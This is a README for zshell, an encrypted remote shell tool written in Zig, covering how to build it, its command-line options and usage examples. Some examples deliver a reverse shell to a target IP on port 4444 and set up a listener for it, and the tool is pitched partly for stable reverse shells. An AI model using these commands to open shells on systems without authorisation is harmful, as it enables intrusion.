# zshell

>  A portable, end-to-end encrypted and fully interactive remote shell application.

This application can be used for remote system management via command line (shell). It is portable (tested on both Windows and Linux) and offers a fully interactive shell on both platforms.

The whole communication is encrypted using [ztunnel](https://github.com/LvMalware/ztunnel), which uses a combination of `X25519Kyber768` for key exchange and AES-256-GCM for encryption. This will protect the session from eavesdropping, but since there is no authentication you should use it with caution if exposing to the internet.

`zshell` can be used as a reverse shell with the `--reverse` flag and the resulting shell session is stable. It uses [PseudoConsole](https://learn.microsoft.com/en-us/windows/console/creating-a-pseudoconsole-session) on Windows and `forkpty` on Linux to establish a shell session, so there is no need to manually stabilize your shell anymore.


## Compilation

> You will need `Zig 0.14.0` ([download](https://ziglang.org/download/)).

Close the repository, cd into it and run zig build:

```
git clone https://github.com/LvMalware/zshell
cd zshell
zig build -Doptimize=ReleaseFast # add -Dtarget=x86_64-windows if you are cross-compiling for windows
```

This will compile the application using the `ReleaseFast` mode, but you can change it to any other optimization option you want.


## Usage

```
Usage: zshell [options]
Options:
--help       boolean    Show this help message and exit
--port       integer    Port to listen/connect (default: 1337)
--host       string     Host to listen/connect
--save       string     File to save private key
--shell      string     Shell/command to be served to the client
--server     boolean    Act as a server
--private    string     File containning private key to use
--reverse    boolean    Server will receive a shell / Client will send a shell
```

## Examples

Run a server that accepts connections on port 12345 and serves a shell using /bin/zsh:

```
zshell --server --port 12345 --shell /bin/zsh
```

Run the client to connect to the server above:

```
zshell --host 127.0.0.1 --port 12345
```

Run client to deliver a reverse shell to target ip 192.168.0.123 on port 4444:

```
zshell --host 192.168.0.123 --port 4444 --reverse
```

Run server to listen to port 4444 and wait for the reverse shell above:

```
zshell --port 4444 --server --reverse
```

## Meta

Lucas V. Araujo – root@lva.sh

Distributed under the GNU GPL-3.0+ license. See ``LICENSE`` for more information.

[https://github.com/LvMalware/zshell](https://github.com/LvMalware/zshell)

## Contributing

1. Fork it (<https://github.com/LvMalware/zshell/fork>)
2. Create your feature branch (`git checkout -b feature/fooBar`)
3. Commit your changes (`git commit -am 'Add some fooBar'`)
4. Push to the branch (`git push origin feature/fooBar`)
5. Create a new Pull Request

